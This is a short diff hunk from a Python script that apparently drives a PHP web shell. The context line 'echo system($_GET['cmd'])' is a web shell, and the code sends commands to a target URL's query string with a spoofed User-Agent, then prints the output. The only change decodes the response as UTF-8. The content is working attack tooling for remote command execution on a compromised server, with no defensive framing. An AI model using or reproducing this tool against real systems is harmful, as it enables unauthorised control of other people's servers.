@@ -95,7 +95,7 @@ echo system($_GET['cmd']);
             #print(url+"?"+cmden)
             URL=Request(url+"?"+cmden,headers={'User-Agent':'Mozilla/24'})
             openurl=urllib.request.urlopen(URL)
-            reponse=str(openurl.read())
+            reponse=str(openurl.read().decode("utf-8"))
             #soup=BeautifulSoup(reponse,"html.parser")
             #for i in soup
             print(reponse.replace('\\n', '  \n'))
